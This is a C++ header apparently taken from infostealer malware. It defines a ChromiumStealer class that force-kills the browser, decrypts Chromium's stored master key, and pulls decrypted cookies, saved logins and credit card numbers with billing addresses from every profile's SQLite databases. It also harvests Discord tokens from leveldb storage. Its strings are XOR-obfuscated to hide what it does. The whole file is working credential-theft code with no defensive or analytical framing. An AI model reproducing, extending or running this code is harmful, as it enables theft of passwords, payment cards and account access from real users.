#pragma once

#include "../result.hpp"
#include "../util.hpp"
#include "base.hpp"
#include <ArduinoJson.h>
#include <sqlite3.h>
#include <wolfssl/wolfcrypt/aes.h>
#include <wolfssl/wolfcrypt/coding.h>

class ChromiumStealer : public AbstractStealer {
public:
  ChromiumStealer(std::string executable, std::filesystem::path path, bool discord = false) : path(path), discord(discord) { hidden_system(va(xor("taskkill /IM %s /F >nul 2>&1"), executable.c_str()).c_str()); }

  inline void steal() override {
    {
      JsonDocument local_state;
      {
        std::string data;
        if (read_binary_file(path / xor("Local State"), data) != 0)
          return;

        deserializeJson(local_state, data);
      }

      std::string master_key_encoded = local_state[xor("os_crypt")][xor("encrypted_key")].as<std::string>();

      master_key.resize((master_key_encoded.size() * 3 + 3) / 4);
      word32 master_key_size = master_key.size();
      Base64_Decode((const byte *)master_key_encoded.c_str(), master_key_encoded.size(), (byte *)master_key.c_str(), &master_key_size);
      master_key.resize(master_key_size);
      if (crypt_unprotect_data(master_key.substr(5), master_key) != 0)
        return;
    }
    PRINTF("Got master key\n");

    constexpr const char *profiles[] = {"", "Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"};
    for (const auto &profile : profiles) {
      PRINTF("Profile: %s\n", profile);
      std::filesystem::path profile_path = strlen(profile) ? path / profile : path;
      if (!std::filesystem::exists(profile_path))
        continue;

      std::filesystem::path cookies_path = profile_path / "Network" / xor("Cookies");
      if (!std::filesystem::exists(cookies_path))
        continue;

      if (discord)
        goto discord;

      PRINTF("Cookies\n");
      do {
        sqlite3 *db;
        if (sqlite3_open(cookies_path.string().c_str(), &db) != SQLITE_OK)
          break;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db, xor("SELECT host_key, name, encrypted_value FROM cookies where encrypted_value is not null order by host_key"), -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
          cookies.push_back(Cookie());
          auto &cookie = cookies.back();

          cookie.host = (const char *)sqlite3_column_text(stmt, 0);
          cookie.name = (const char *)sqlite3_column_text(stmt, 1);
          const char *blob = (const char *)sqlite3_column_blob(stmt, 2);
          if (blob == nullptr)
            continue;

          cookie.value = decrypt_password((byte *)blob, sqlite3_column_bytes(stmt, 2));
        }
      } while (false);

      PRINTF("Logins\n");
      do {
        sqlite3 *db;
        if (sqlite3_open((profile_path / xor("Login Data")).string().c_str(), &db) != SQLITE_OK)
          break;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db, xor("SELECT origin_url, username_value, password_value FROM logins"), -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
          logins.push_back(Login());
          auto &login = logins.back();

          login.website = (const char *)sqlite3_column_text(stmt, 0);
          login.username = (const char *)sqlite3_column_text(stmt, 1);
          const char *blob = (const char *)sqlite3_column_blob(stmt, 2);
          if (blob == nullptr)
            continue;

          login.password = decrypt_password((byte *)blob, sqlite3_column_bytes(stmt, 2));
        }
      } while (false);

      PRINTF("Cards\n");
      do {
        sqlite3 *db;
        if (sqlite3_open((profile_path / xor("Web Data")).string().c_str(), &db) != SQLITE_OK)
          break;

        sqlite3_stmt *stmt;
        sqlite3_prepare_v2(db, xor("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards"), -1, &stmt, nullptr);

        while (sqlite3_step(stmt) == SQLITE_ROW) {
          cards.push_back(CreditCard());
          auto &card = cards.back();

          card.name = (const char *)sqlite3_column_text(stmt, 0);
          card.expiration = va(xor("%s/%s"), std::to_string(sqlite3_column_int(stmt, 1)).c_str(), std::to_string(sqlite3_column_int(stmt, 2)).c_str());

          const char *blob = (const char *)sqlite3_column_blob(stmt, 3);
          if (blob == nullptr)
            continue;

          card.number = decrypt_password((byte *)blob, sqlite3_column_bytes(stmt, 3));

          std::string billing_address_id = (const char *)sqlite3_column_text(stmt, 4);
          if (billing_address_id.empty())
            continue;

          sqlite3_stmt *stmt2;
          sqlite3_prepare_v2(db, va(xor("SELECT type, value FROM local_addresses_type_tokens where guid = '%s'"), billing_address_id).c_str(), -1, &stmt2, nullptr);

          while (sqlite3_step(stmt2) == SQLITE_ROW) {
            std::string value = (const char *)sqlite3_column_text(stmt2, 1);
            switch (sqlite3_column_int(stmt2, 0)) {
            case 33: card.city = value; break;
            case 34: card.state = value; break;
            case 35: card.zip = value; break;
            case 36: card.country = value; break;
            case 77: card.street = value; break;
            default: continue;
            }
          }
        }
      } while (false);

    discord:
      PRINTF("Discord Tokens\n");
      do {
        auto level_db_path = profile_path / xor("Local Storage") / xor("leveldb");
        if (!std::filesystem::exists(level_db_path))
          break;

        for (const auto &entry : std::filesystem::directory_iterator(level_db_path)) {
          if (entry.path().extension() != xor(".ldb") && entry.path().extension() != xor(".log"))
            continue;

          std::string content;
          if (read_binary_file(entry.path(), content) != 0)
            continue;

          if (discord) {
            for (std::size_t pos = 0; (pos = content.find(xor("dQw4w9WgXcQ:"), pos + 1)) != std::string::npos;) {
              std::string decoded;
              {
                std::string token = content.substr(pos + 12, content.find('"', pos) - pos - 12);
                decoded.resize((token.size() * 3 + 3) / 4);
                word32 decoded_size = decoded.size();
                Base64_Decode((const byte *)token.c_str(), token.size(), (byte *)decoded.c_str(), &decoded_size);
                decoded = decrypt_password((byte *)decoded.c_str(), decoded_size);
              }

              append_discord_token(decoded);
            }
          }

          for (std::size_t i = 0; i + 32 < content.size(); ++i) {
            if (content[i + 24] != '.' || content[i + 31] != '.')
              continue;

            if (!std::all_of(content.begin() + i, content.begin() + i + 31, [](char c) { return (c >= '0' && c <= 'z') || c == '.'; }))
              continue;

            std::size_t end = i + 32;
            while (end < content.size() && content[end] >= '0' && content[end] <= 'z')
              ++end;

            append_discord_token(content.substr(i, end - i));
          }
        }
      } while (false);
    }
  }

private:
  std::string executable;
  std::filesystem::path path;
  std::string master_key;
  bool discord;

  std::string decrypt_password(const byte *data, size_t size) {
    Aes aes;
    wc_AesGcmSetKey(&aes, (byte *)master_key.data(), master_key.size());
    std::string output(size - (15 + 16), 0);
    wc_AesGcmDecrypt(&aes, (byte *)&output[0], data + 15, output.size(), data + 3, 12, data + size - 16, 16, nullptr, 0);
    wc_AesFree(&aes);
    return output;
  }
};